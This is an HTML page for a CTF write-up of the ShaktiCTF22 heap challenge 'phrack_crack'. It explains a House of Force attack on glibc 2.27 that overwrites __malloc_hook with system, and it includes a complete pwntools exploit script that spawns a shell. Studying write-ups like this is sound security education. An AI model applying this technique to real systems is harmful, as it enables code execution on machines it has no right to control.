@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        <link rel="canonical" href="https://github.com/Team-Shakti/CTF-Write-ups/ShaktiCTF22/pwn/phrack_crack/writeup/">
+        <link rel="shortcut icon" href="../../../../img/favicon.ico">
+        <title>phrack_crack - CTF-Writeups</title>
+        <link href="../../../../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../../../../css/font-awesome.min.css" rel="stylesheet">
+        <link href="../../../../css/base.css" rel="stylesheet">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/styles/darcula.min.css">
+
+        <script src="../../../../js/jquery-1.10.2.min.js" defer></script>
+        <script src="../../../../js/bootstrap.min.js" defer></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js"></script>
+        <script>hljs.initHighlightingOnLoad();</script> 
+    </head>
+
+    <body>
+        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-dark">
+            <div class="container">
+                <a class="navbar-brand" href="../../../..">CTF-Writeups</a>
+                <!-- Expander button -->
+                <button type="button" class="navbar-toggler" data-toggle="collapse" data-target="#navbar-collapse">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+
+                <!-- Expanded navigation -->
+                <div id="navbar-collapse" class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li class="navitem">
+                                <a href="../../../../about/" class="nav-link">About Us</a>
+                            </li>
+                            <li class="navitem">
+                                <a href="../../../../shaktictf/" class="nav-link">ShaktiCTF</a>
+                            </li>
+                            <li class="navitem">
+                                <a href="https://team-shakti.github.io/" class="nav-link">Website</a>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav ml-auto">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link" data-toggle="modal" data-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                            <li class="nav-item">
+                                <a href="https://github.com/Team-Shakti/CTF-Write-ups/blob/master/docs/ShaktiCTF22/pwn/phrack_crack/writeup.md" class="nav-link">Edit on Team-Shakti/CTF-Write-ups
+                                    </a>
+                            </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="row">
+                    <div class="col-md-3"><div class="navbar-light navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggler collapsed" data-toggle="collapse" data-target="#toc-collapse" title="Table of Contents">
+            <span class="fa fa-angle-down"></span>
+        </button>
+    </div>
+
+    
+    <div id="toc-collapse" class="navbar-collapse collapse card bg-secondary">
+        <ul class="nav flex-column">
+            
+            <li class="nav-item" data-level="1"><a href="#phrack_crack" class="nav-link">phrack_crack</a>
+              <ul class="nav flex-column">
+            <li class="nav-item" data-level="2"><a href="#preliminary-analysis" class="nav-link">Preliminary Analysis</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-level="2"><a href="#exploit" class="nav-link">Exploit</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+              </ul>
+            </li>
+        </ul>
+    </div>
+</div></div>
+                    <div class="col-md-9" role="main">
+
+<h1 id="phrack_crack">phrack_crack</h1>
+<p>Author: <a href="https://twitter.com/BhaskaraShravya">d1g174l_f0rtr355</a></p>
+<p>Solves: 9</p>
+<p>Difficulty: Hard</p>
+<h2 id="preliminary-analysis">Preliminary Analysis</h2>
+<p>We notice that the binary given to us is a 64 bit non-stripped file with the following memory protections:</p>
+<pre><code>    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x3fe000)
+    RUNPATH:  b'./libc'
+
+</code></pre>
+<p>We notice that a libc has also been provided. You may choose to patch the binary to the libc given. With only PIE enabled, we cannot formulate the exploit technique at first glance. So let's get an understanding of the binary.</p>
+<p>```
+ GNU C Library (GNU libc) stable release version 2.27.
+Copyright (C) 2018 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.
+There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
+PARTICULAR PURPOSE.
+Compiled by GNU CC version 7.5.0.
+libc ABIs: UNIQUE IFUNC
+For bug reporting instructions, please see:
+<a href="http://www.gnu.org/software/libc/bugs.html">http://www.gnu.org/software/libc/bugs.html</a>.</p>
+<pre><code>Another important detail we need to notice is that the libc version provided to us is Glibc 2.27. 
+
+## Understanding the binary
+
+As we run the program, we see that we are presented with four choices: 
+</code></pre>
+<ol>
+<li>malloc 0/4</li>
+<li>edit</li>
+<li>target</li>
+<li>quit</li>
+</ol>
+<pre><code>We can allocate atmost 4 chunks on the heap. Also we notice two generous leaks given to us. One leak being the libc addres sof puts and the other a heap address as seen from the decompiled code below:
+</code></pre>
+<p>printf("Here's a generous leak for you! %p\n\n", &amp;puts);
+  idx = 0;
+  ptr = malloc(0x88uLL);
+  printf("Here's one more generous leak for you: %p\n", (char *)ptr - 64);
+  free(ptr);
+  while ( 1 )
+  {
+    printf("\nMENU\n\n1. malloc %u/%u\n", (unsigned int)idx, 4LL);</p>
+<pre><code>
+Upon further decompilation of the binary, we observe that when we try to malloc() a chunk, we are asked for size and data. However the code snippet below shows that there is no check on the size of the chunk. This enables us to give a very large sized chunk evetually resulting in a Hous of Force attack since the libc version given is also 2.27. 
+</code></pre>
+<pre><code>    case 1:
+      fflush(stdout);
+      if ( idx &lt; 0 )
+      {
+        puts("No negative indices allowed!");
+        exit(0);
+      }
+      if ( idx &gt; 4 )
+      {
+        puts("maximum requests reached!");
+        exit(0);
+      }
+      puts("Enter size: ");
+      __isoc99_scanf("%ld", &amp;size);
+      m_array[idx] = malloc(size);
+      if ( !m_array[idx] )
+      {
+        puts("request failed!\n");
+        exit(0);
+      }
+      puts("data: ");
+      get_inp(m_array[idx++], (unsigned int)size);
+      break;
+</code></pre>
+<p>```
+ The edit() function asks for index at which we need to edit the chunk, and checks if the index is between 0-4. </p>
+<p>## Exploitation</p>
+<p>Since there is no size check on any of the chunks, we can make use of this vulnerability to overwrite the top chunk. Furthermore, we can request a chunk of a suitable large size. Generally, our memory map looks something like this:
+<img alt="Screenshot from 2022-12-16 16-17-50" src="https://user-images.githubusercontent.com/59280388/208084571-f2b1d4ce-9aa6-498c-b686-71822e3d0380.png" /></p>
+<p>In the above image, the binary/ code_base addresses reside at the lowest address and the stack resides at the highest address. </p>
+<p>Now think!</p>
+<p>If we overwrote the top chunk size field, then from malloc's perspective, the heap could extend across the gap overlapping sensitive data in the library or the stack region. However, we see that the <code>target</code> variable resides in the data section of the binary which is at a lower address than the heap. Look at the diagram below!</p>
+<p><img alt="Screenshot from 2022-12-16 16-19-09" src="https://user-images.githubusercontent.com/59280388/208087361-eb33359d-b1b2-4bcf-b750-cf1a6faf823c.png" /></p>
+<p>Hence, if we overwrote a really large value into the top chunk size field, it would appear as though it extended past the virtual address space, wrapping around to the start of the memory map. Then we can make another request for malloc, overwrite the <code>target</code> variable in the data section. However, upon a little closer observation, we realize that overwriting the <code>target</code> address is eventually of no significance to us in trying to obtaina shell. Hence we shall make use the above same concept to overwrite <code>__malloc_hook</code>, with a pointer to system. Since <code>__malloc_hook</code> is internally called when trying to allocate a chunk through <code>malloc</code>, we see that when we try to request another chunk, <code>system()</code> will infact be executed. All we need to make sure is to place the string <code>/bin/sh</code> onto the heap. This is the concept behind the House of Force attack in the binary.</p>
+<h2 id="exploit">Exploit</h2>
+<pre><code>def malloc(size, data):
+    p.sendline(b'1')
+    p.sendlineafter(b'Enter size: \n', str(size))
+    p.sendlineafter(b'data: \n', data)
+
+def edit(ind, data):
+    p.sendline(b'2')
+    p.sendlineafter(b'Enter index: \n', str(ind))
+    p.sendlineafter(b'data: \n', data)
+
+from pwn import *
+
+p = process('./phrack_crack')
+gdb.attach(p)
+
+p.recvuntil('! ')
+libc = int(p.recvline()[:-1], 16)
+
+info('libc: %s'%hex(libc))
+
+p.recvuntil(&quot;Here's one more generous leak for you: &quot;)
+heap = int(p.recvline()[:-1], 16) - 0x630
+
+info('heap: %s'%hex(heap))
+
+# malloc
+malloc(24, b'a'*20)
+
+edit(0, b'b'*24 + p64(0xffffffffffffffff))
+
+libc_base = libc - 0x6dba0
+malloc_hook = libc_base + 0x3aec30
+system = libc_base + 0x41710
+binsh = libc_base + 0x175e93
+
+
+dist = (malloc_hook - 0x10) - (heap + 0x1710 + 0x20)
+info('dist: %s'%hex(dist))
+malloc(dist, b'c')
+
+malloc(30, p64(system))
+p.sendline(b'1')
+p.sendlineafter(b'Enter size: \n', str(binsh))
+
+p.interactive()
+</code></pre></div>
+            </div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+                <p>Copyright &copy; 2020 <a href="http://Team-Shakti.github.io/">Team-Shakti Writeups</a></p>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script>
+            var base_url = "../../../..",
+                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
+        </script>
+        <script src="../../../../js/base.js" defer></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+        <script src="../../../../search/main.js" defer></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="searchModalLabel">Search</h4>
+                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+            </div>
+            <div class="modal-body">
+                <p>From here you can search these documents. Enter your search terms below.</p>
+                <form>
+                    <div class="form-group">
+                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
+                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
